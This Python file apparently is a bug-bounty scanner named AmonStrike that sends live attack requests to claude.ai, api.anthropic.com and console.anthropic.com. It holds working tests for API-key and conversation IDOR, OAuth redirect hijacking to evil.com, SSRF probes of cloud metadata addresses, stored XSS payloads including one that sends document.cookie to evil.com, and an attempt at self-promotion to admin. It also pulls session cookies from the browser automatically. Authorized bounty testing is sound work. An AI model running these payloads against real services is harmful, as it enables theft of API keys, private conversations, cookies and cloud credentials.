#!/usr/bin/env python3
"""
AmonStrike — Anthropic Bug Bounty Scanner
Program: hackerone.com/anthropic
Core assets: $7,500-$10,000 CRITICAL

IMPORTANT:
- Use jardani101@wearehackerone.com for test accounts
- Add X-HackerOne-Handle: jardani101 to all requests
- Manually verify ALL findings before submitting
- Do not submit AI-generated reports
"""
import sys, json, time, requests, urllib3, re
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
urllib3.disable_warnings()

H1_HANDLE  = "jardani101"
H1_EMAIL   = "jardani101@wearehackerone.com"
PROGRAM    = "anthropic"

CORE_ASSETS = [
    "https://claude.ai",
    "https://api.anthropic.com",
    "https://console.anthropic.com",
]

HEADERS = {
    "X-HackerOne-Handle": H1_HANDLE,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
}


def build_session(cookies: dict = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    if cookies:
        s.cookies.update(cookies)
    return s


def test_api_key_idor(session_a: requests.Session,
                       session_b: requests.Session) -> list:
    """
    Test if User B can access User A's API keys.
    This is the #1 highest-value bug on console.anthropic.com
    """
    findings = []
    print("\n[*] Testing API Key IDOR...")

    # Get User A's API keys
    r = session_a.get(
        "https://console.anthropic.com/api/organizations",
        timeout=10
    )
    if not r or r.status_code != 200:
        print("  [!] Cannot get organizations — need valid session")
        return findings

    try:
        orgs = r.json()
        for org in (orgs if isinstance(orgs, list) else [orgs]):
            org_id = org.get("id") or org.get("uuid") or org.get("organization_id")
            if not org_id:
                continue

            # Get API keys for this org as User A
            r2 = session_a.get(
                f"https://console.anthropic.com/api/organizations/{org_id}/api_keys",
                timeout=10
            )
            if r2 and r2.status_code == 200:
                keys = r2.json()
                for key in (keys if isinstance(keys, list) else []):
                    key_id = key.get("id") or key.get("key_id")
                    if not key_id:
                        continue

                    # Try to access this key as User B
                    r3 = session_b.get(
                        f"https://console.anthropic.com/api/organizations/{org_id}/api_keys/{key_id}",
                        timeout=10
                    )
                    if r3 and r3.status_code == 200:
                        findings.append({
                            "title":    "CRITICAL IDOR — API Key Accessible by Unauthorized User",
                            "severity": "CRITICAL",
                            "url":      f"https://console.anthropic.com/api/organizations/{org_id}/api_keys/{key_id}",
                            "evidence": f"User B accessed User A's API key\nOrg: {org_id}\nKey: {key_id}\nResponse: {r3.text[:300]}",
                            "poc":      f'curl -sk "https://console.anthropic.com/api/organizations/{org_id}/api_keys/{key_id}" -H "X-HackerOne-Handle: {H1_HANDLE}" -H "Cookie: USER_B_SESSION"',
                            "impact":   "Attacker can steal API keys of any Anthropic organization, use their credits, access their conversations",
                        })
                        print(f"  [!!!] CRITICAL IDOR FOUND: {key_id}")
                    else:
                        print(f"  [✓] Key {key_id} properly protected (403/401)")
    except Exception as e:
        print(f"  [!] Error: {e}")

    return findings


def test_conversation_idor(session_a: requests.Session,
                            session_b: requests.Session) -> list:
    """Test if User B can read User A's conversations."""
    findings = []
    print("\n[*] Testing Conversation IDOR...")

    # Get User A's conversations
    for endpoint in [
        "https://claude.ai/api/organizations",
        "https://claude.ai/api/auth/session",
    ]:
        try:
            r = session_a.get(endpoint, timeout=10)
            if r and r.status_code == 200:
                data = r.json()
                org_id = None
                if isinstance(data, dict):
                    org_id = (data.get("organization_id") or
                             data.get("user",{}).get("organization_id") or
                             data.get("id"))
                if not org_id:
                    continue

                # Get conversations
                r2 = session_a.get(
                    f"https://claude.ai/api/organizations/{org_id}/chat_conversations",
                    timeout=10
                )
                if r2 and r2.status_code == 200:
                    convs = r2.json()
                    conv_list = convs if isinstance(convs, list) else convs.get("data",[])
                    for conv in conv_list[:3]:
                        conv_id = conv.get("uuid") or conv.get("id")
                        if not conv_id:
                            continue

                        # Try as User B
                        r3 = session_b.get(
                            f"https://claude.ai/api/organizations/{org_id}/chat_conversations/{conv_id}",
                            timeout=10
                        )
                        if r3 and r3.status_code == 200:
                            findings.append({
                                "title":    "CRITICAL IDOR — Conversation Accessible by Unauthorized User",
                                "severity": "CRITICAL",
                                "url":      f"https://claude.ai/api/organizations/{org_id}/chat_conversations/{conv_id}",
                                "evidence": f"User B read User A's private conversation\n{r3.text[:300]}",
                                "poc":      f'curl -sk "https://claude.ai/api/organizations/{org_id}/chat_conversations/{conv_id}" -H "Cookie: USER_B_SESSION"',
                                "impact":   "Any user can read other users' private Claude conversations",
                            })
                            print(f"  [!!!] CRITICAL IDOR: conversation {conv_id}")
                        else:
                            print(f"  [✓] Conversation {conv_id} properly protected")
        except Exception as e:
            print(f"  [!] {endpoint}: {e}")

    return findings


def test_oauth_flows(session: requests.Session) -> list:
    """Test OAuth implementation for token theft."""
    findings = []
    print("\n[*] Testing OAuth flows...")

    oauth_endpoints = [
        "https://claude.ai/auth/google",
        "https://console.anthropic.com/auth/google",
        "https://claude.ai/login",
    ]

    for ep in oauth_endpoints:
        try:
            r = session.get(ep, allow_redirects=False, timeout=10)
            if r and r.status_code in [301,302]:
                location = r.headers.get("Location","")
                if "redirect_uri=" in location:
                    # Test redirect_uri manipulation
                    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                    parsed = urlparse(location)
                    params = parse_qs(parsed.query)
                    if "redirect_uri" in params:
                        original_uri = params["redirect_uri"][0]
                        # Try evil redirect
                        params["redirect_uri"] = ["https://evil.com"]
                        new_query = urlencode(params, doseq=True)
                        evil_url  = urlunparse(parsed._replace(query=new_query))

                        r2 = session.get(evil_url, allow_redirects=False, timeout=10)
                        if r2 and r2.status_code in [301,302]:
                            loc2 = r2.headers.get("Location","")
                            if "evil.com" in loc2:
                                findings.append({
                                    "title":    "OAuth Redirect URI Bypass — Token Theft",
                                    "severity": "CRITICAL",
                                    "url":      evil_url,
                                    "evidence": f"Redirect to evil.com allowed\nLocation: {loc2}",
                                    "poc":      f'curl -sk -I "{evil_url}" -H "X-HackerOne-Handle: {H1_HANDLE}"',
                                    "impact":   "Attacker steals OAuth code/token → full account takeover",
                                })
                                print(f"  [!!!] OAUTH REDIRECT BYPASS: {ep}")
                            else:
                                print(f"  [✓] OAuth redirect properly validated")
        except Exception as e:
            print(f"  [!] {ep}: {e}")

    return findings


def test_ssrf(session: requests.Session) -> list:
    """Test SSRF in file upload or URL processing."""
    findings = []
    print("\n[*] Testing SSRF...")

    # Claude.ai might process URLs or files
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://localhost:8080/",
        "http://internal.anthropic.com/",
    ]

    upload_endpoints = [
        "https://claude.ai/api/upload",
        "https://claude.ai/api/files",
        "https://api.anthropic.com/v1/files",
    ]

    real_meta = ["ami-id","instance-id","AccessKeyId","serviceAccounts",
                 "local-ipv4","placement"]

    for ep in upload_endpoints:
        for ssrf_url in ssrf_payloads[:2]:
            try:
                # Try URL-based SSRF
                r = session.post(ep,
                    json={"url": ssrf_url, "source": ssrf_url, "file_url": ssrf_url},
                    timeout=10
                )
                if r:
                    response_section = r.text
                    if any(k in response_section for k in real_meta):
                        findings.append({
                            "title":    "CRITICAL SSRF — Internal Anthropic Infrastructure",
                            "severity": "CRITICAL",
                            "url":      ep,
                            "evidence": f"SSRF payload: {ssrf_url}\nResponse: {r.text[:400]}",
                            "poc":      f'curl -sk -X POST "{ep}" -H "Content-Type: application/json" -d \'{{"url":"{ssrf_url}"}}\' -H "X-HackerOne-Handle: {H1_HANDLE}"',
                            "impact":   "Access to Anthropic internal AWS/GCP infrastructure, IAM credentials",
                        })
                        print(f"  [!!!] SSRF CONFIRMED: {ssrf_url} via {ep}")
            except Exception as e:
                pass

    if not findings:
        print("  [✓] No SSRF found on tested endpoints")

    return findings


def test_stored_xss(session: requests.Session) -> list:
    """Test stored XSS in claude.ai conversations."""
    findings = []
    print("\n[*] Testing Stored XSS...")

    xss_payloads = [
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=fetch('https://evil.com/?c='+document.cookie)>",
        "javascript:alert(1)",
        "<script>alert(document.domain)</script>",
    ]

    # Try to inject XSS via conversation title, file name, etc.
    endpoints = [
        "https://claude.ai/api/organizations/{org}/chat_conversations",
    ]

    # Get org ID first
    try:
        r = session.get("https://claude.ai/api/auth/session", timeout=10)
        if r and r.status_code == 200:
            org_id = r.json().get("user",{}).get("organization_id","")
            if org_id:
                for payload in xss_payloads[:2]:
                    r2 = session.post(
                        f"https://claude.ai/api/organizations/{org_id}/chat_conversations",
                        json={"name": payload, "uuid": "test"},
                        timeout=10
                    )
                    if r2 and r2.status_code in [200,201]:
                        # Check if payload stored unencoded
                        r3 = session.get(
                            f"https://claude.ai/api/organizations/{org_id}/chat_conversations",
                            timeout=10
                        )
                        if r3 and payload in r3.text:
                            findings.append({
                                "title":    "Stored XSS — Conversation Title",
                                "severity": "HIGH",
                                "url":      f"https://claude.ai/api/organizations/{org_id}/chat_conversations",
                                "evidence": f"XSS payload stored unencoded\nPayload: {payload}",
                                "poc":      f"Create conversation with name: {payload}",
                                "impact":   "Attacker can steal session cookies of users who view shared conversations",
                            })
                            print(f"  [!!!] STORED XSS: {payload}")
                        else:
                            print(f"  [✓] Payload encoded/rejected")
    except Exception as e:
        print(f"  [!] XSS test error: {e}")

    return findings


def test_org_privilege_escalation(session: requests.Session) -> list:
    """Test if member can escalate to admin within organization."""
    findings = []
    print("\n[*] Testing privilege escalation...")

    try:
        r = session.get("https://console.anthropic.com/api/organizations", timeout=10)
        if r and r.status_code == 200:
            orgs = r.json() if isinstance(r.json(), list) else [r.json()]
            for org in orgs[:2]:
                org_id = org.get("id","")
                if not org_id: continue

                # Try to promote self to admin
                r2 = session.put(
                    f"https://console.anthropic.com/api/organizations/{org_id}/members/me",
                    json={"role": "admin", "permissions": ["admin"]},
                    timeout=10
                )
                if r2 and r2.status_code in [200,201]:
                    if "admin" in r2.text.lower():
                        findings.append({
                            "title":    "Privilege Escalation — Member to Admin",
                            "severity": "CRITICAL",
                            "url":      f"https://console.anthropic.com/api/organizations/{org_id}/members/me",
                            "evidence": f"Role escalated to admin\n{r2.text[:300]}",
                            "poc":      f'curl -sk -X PUT "https://console.anthropic.com/api/organizations/{org_id}/members/me" -d \'{{"role":"admin"}}\'',
                            "impact":   "Any organization member can become admin, access all API keys and billing",
                        })
                        print(f"  [!!!] PRIVILEGE ESCALATION in org {org_id}")
                else:
                    print(f"  [✓] Org {org_id} role change properly restricted")
    except Exception as e:
        print(f"  [!] Error: {e}")

    return findings


def run_scan(session_a_cookies: dict, session_b_cookies: dict = None):
    """Run full Anthropic-specific scan."""
    print(f"""
╔══════════════════════════════════════════════════════════╗
║  AmonStrike — Anthropic Bug Bounty Scanner               ║
║  Program: hackerone.com/anthropic                        ║
║  Target: $7,500-$10,000 CRITICAL bugs                   ║
╚══════════════════════════════════════════════════════════╝
  H1 Handle: {H1_HANDLE}
  Test email: {H1_EMAIL}
""")

    s_a = build_session(session_a_cookies)
    s_b = build_session(session_b_cookies) if session_b_cookies else build_session()

    all_findings = []

    # Run all tests
    all_findings.extend(test_ssrf(s_a))
    all_findings.extend(test_stored_xss(s_a))
    all_findings.extend(test_oauth_flows(s_a))
    all_findings.extend(test_org_privilege_escalation(s_a))

    if session_b_cookies:
        all_findings.extend(test_api_key_idor(s_a, s_b))
        all_findings.extend(test_conversation_idor(s_a, s_b))
    else:
        print("\n[!] For IDOR tests: create two accounts and provide both sessions")
        print("    python3 anthropic_scan.py --session-a COOKIES_A --session-b COOKIES_B")

    # Summary
    print(f"\n{'='*60}")
    print(f"  RESULTS: {len(all_findings)} findings")
    print(f"{'='*60}")

    for f in all_findings:
        print(f"\n  [{f['severity']}] {f['title']}")
        print(f"  URL: {f['url']}")
        print(f"  PoC: {f['poc'][:80]}")
        print(f"  Impact: {f['impact'][:80]}")

    if all_findings:
        import os, json as _j
        os.makedirs("output/anthropic", exist_ok=True)
        out = f"output/anthropic/findings_{int(time.time())}.json"
        open(out,'w').write(_j.dumps(all_findings, indent=2))
        print(f"\n  [+] Saved: {out}")
        print(f"\n  NEXT: Manually verify each finding before submitting to H1")
        print(f"  REMEMBER: Do not submit AI-generated text — write your own report")
    else:
        print("\n  No findings. Need authenticated sessions for deeper testing.")
        print("  Login to claude.ai and console.anthropic.com in Firefox first.")

    return all_findings


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--session-a", help="Session A cookies JSON")
    p.add_argument("--session-b", help="Session B cookies JSON (second account)")
    p.add_argument("--auto",      action="store_true",
                   help="Auto-grab sessions from Firefox")
    args = p.parse_args()

    cookies_a = {}
    cookies_b = {}

    from core.session_manager import SessionManager
    sm = SessionManager()

    if args.session_a:
        cookies_a = json.loads(args.session_a)
    else:
        # Auto-grab from browser
        print("[*] Auto-detecting claude.ai sessions...")
        sessions = sm.get_multi("claude.ai", count=2)
        cookies_a = sessions[0] if len(sessions) > 0 else {}
        cookies_b = sessions[1] if len(sessions) > 1 else {}

    if args.session_b:
        cookies_b = json.loads(args.session_b)

    if not cookies_a:
        sm._alert_missing("claude.ai", "user")
        sys.exit(1)

    run_scan(cookies_a, cookies_b)
